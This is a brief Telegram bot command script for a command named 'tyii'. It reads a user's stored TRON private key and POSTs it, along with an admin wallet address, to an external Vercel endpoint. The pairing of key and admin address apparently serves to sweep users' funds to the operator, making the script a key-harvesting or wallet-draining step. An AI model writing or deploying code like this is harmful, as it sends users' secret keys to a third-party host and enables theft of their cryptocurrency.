/*CMD
  command: tyii
  help: 
  need_reply: 
  auto_retry_time: 
  folder: 
  answer: 
  keyboard: 
  aliases: 
CMD*/

var w = Bot.getProperty("adurasss"+user.telegramid)

var me = Bot.getProperty("dem")

HTTP.post( {
    url: "https://tronb2.vercel.app/easytrx",
    success: '/onIncomeTRX',
    body: {private_key: w,Admin_tron_address:me}})
